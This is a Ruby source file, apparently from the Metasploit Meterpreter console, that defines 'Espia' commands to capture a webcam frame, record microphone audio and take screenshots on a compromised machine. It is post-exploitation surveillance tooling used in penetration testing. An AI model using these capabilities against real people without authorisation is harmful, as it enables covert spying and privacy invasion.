require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Nah
#
###
class Console::CommandDispatcher::Espia

	Klass = Console::CommandDispatcher::Espia

	include Console::CommandDispatcher

	#
	# Initializes an instance of the espia command interaction.
	#
	def initialize(shell)
		super
	end

	#
	# List of supported commands.
	#
	def commands
		{
			"dev_image" => "Attempt to grab a frame from webcam",
			"dev_audio" => "Attempt to record mic audio",
			"dev_screen" => "Attempt to grab screen shot"
		}
	end
	
	def cmd_dev_image()
		client.espia.espia_video_get_dev_image()
		print_line("[*] Done.")
		
		return true
	end
	
	def cmd_dev_audio(*args)
		maxrec = 60
		
		if (args.length < 1)
			print_line("Usage: dev_audio <rec_secs>\n")
			print_line("Record mic audio\n")
			return true
		end
		
		secs = args[0].to_i
		if secs  > 0 and secs <= maxrec
			milsecs = secs*1000
			print_line("[*] Recording #{milsecs} miliseconds.\n")
			client.espia.espia_audio_get_dev_audio(milsecs)
			print_line("[*] Done.")
		else	
			print_line("[-] Error: Recording time 0 to 60 secs \n")
		end	
		
		return true
	end
	
	def cmd_dev_screen(*args)
		if (args.length < 1)
			print_line("Usage: dev_screen <store_path>\n")
			print_line("Grab screen shot\n")
			return true
		end
		
		storepath = args[0]	
		
		sf = client.espia.espia_image_get_dev_screen(storepath)
		print_line("[*] Image saved: #{sf}")
		print_line("[*] Done.")

		return true
	end

	#
	# Name for this dispatcher
	#
	def name
		"Espia"
	end

end

end
end
end
end